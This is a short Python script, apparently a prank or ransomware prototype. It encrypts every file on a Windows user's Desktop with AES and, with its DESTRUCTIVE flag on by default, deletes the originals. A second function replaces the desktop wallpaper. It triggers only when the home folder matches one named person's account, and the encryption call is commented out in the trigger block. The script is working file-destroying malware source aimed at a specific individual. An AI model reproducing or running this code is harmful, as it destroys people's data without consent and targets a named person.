import os
import ctypes
import cr

# encryption/decryption buffer size - 64K
BUFFERSIZE = 64 * 1024
DESTRUCTIVE = True
DECRYPT = False
userPath = os.path.expanduser("~")
path = userPath + '\\Desktop'

def apocalypse():
    print("DECRYPTING...")
    cr.decryptFile(os.path.abspath("cra.aes"), os.getcwd()+"\\arabes.png", cr.password, BUFFERSIZE)
    print("CHANGING BACKGROUND...")
    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath("arabes.png") , 0)
    print("BACKGROUND CHANGED SUCCESSFULLY")

def no():
    if DECRYPT:
        print("DECRYPTING...")
    else:
        print("ENCRYPTING...")
    if DESTRUCTIVE:
        print("DESTRUCTIVE ENABLED")
    else:
        print("DESTRUCTIVE DISABLED")
    dirList = os.listdir(path)
    for objet in dirList:
        if os.path.isfile(path+"\\"+objet)and not(objet == 'main.py')and not(objet == 'cr.py'):
            if DECRYPT:
                if '.aes' in objet:
                    cr.decryptFile(path+"\\"+objet, path+"\\"+objet[:-4], cr.password, BUFFERSIZE)
                if DESTRUCTIVE:
                    os.remove(path+"\\"+objet)

            else:
                cr.encryptFile(path+"\\"+objet, path+"\\"+objet+".aes", cr.password, BUFFERSIZE)
                if DESTRUCTIVE:
                    os.remove(path+"\\"+objet)
    print("FILES CRYPTED SUCCESSFULLY")

# detecteur de tibo
if userPath == 'C:\\Users\\Valérie de Brémand':
    print("TIBO DETECTE")
    apocalypse()
    #no()